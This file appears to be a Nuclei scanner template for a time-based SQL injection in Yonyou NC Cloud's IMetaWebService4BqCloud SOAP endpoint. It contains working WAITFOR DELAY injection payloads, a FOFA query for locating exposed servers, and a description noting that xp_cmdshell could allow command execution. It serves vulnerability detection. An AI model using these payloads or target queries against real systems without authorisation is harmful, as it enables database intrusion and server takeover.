common/config/pocs/nuclei-2025/用友NC-Cloud-IMetaWebService4BqCloud-SQL延时注入漏洞.yaml

http:
    - matchers:
        - condition: and
          dsl:
            - duration_1>=4 && duration_1<=5
            - duration_2>=8 && duration_2<=9
          type: dsl
      raw:
        - |
          POST /uapws/service/uap.pubitf.ae.meta.IMetaWebService4BqCloud HTTP/1.1
          Host: {{Hostname}}
          Content-Type: text/xml;charset=UTF-8

          <soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:imet="http://meta.ae.pubitf.uap/IMetaWebService4BqCloud">
            <soapenv:Header/>
            <soapenv:Body>
                <imet:loadFields>
                  <!--type: string-->
                  <imet:string>SmartModel^1';WAITFOR DELAY '0:0:4'--</imet:string>
                </imet:loadFields>
            </soapenv:Body>
          </soapenv:Envelope>
        - |
          POST /uapws/service/uap.pubitf.ae.meta.IMetaWebService4BqCloud HTTP/1.1
          Host: {{Hostname}}
          Content-Type: text/xml;charset=UTF-8

          <soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:imet="http://meta.ae.pubitf.uap/IMetaWebService4BqCloud">
            <soapenv:Header/>
            <soapenv:Body>
                <imet:loadFields>
                  <!--type: string-->
                  <imet:string>SmartModel^1';WAITFOR DELAY '0:0:8'--</imet:string>
                </imet:loadFields>
            </soapenv:Body>
          </soapenv:Envelope>
id: yongyouNC-Cloud-IMetaWebService4BqCloud-sql-time
info:
    author: Superhero
    description: |-
        fofa: (body="UFIDA" && body="logo/images/") || (body="logo/images/ufida_nc.png") || title="Yonyou NC" || body="<div id=\"nc_text\">" || body="<div id=\"nc_img\" onmouseover=\"overImage('nc');" || (title="产品登录界面" && body="UFIDA NC") || (body="/Client/Uclient/UClient.exe" && title="Yonyou UAP")
        用友NC Cloud IMetaWebService4BqCloud接口存在SQL注入漏洞，攻击者通过利用SQL注入漏洞配合数据库xp_cmdshell可以执行任意命令，从而控制服务器。经过分析与研判，该漏洞利用难度低，建议尽快修复。
    name: 用友NC Cloud IMetaWebService4BqCloud SQL注入漏洞
    reference:
        - https://mp.weixin.qq.com/s/kqXz-fPLHCO-nHlEeEWmPg
    severity: high
    tags:
        - 用友NC
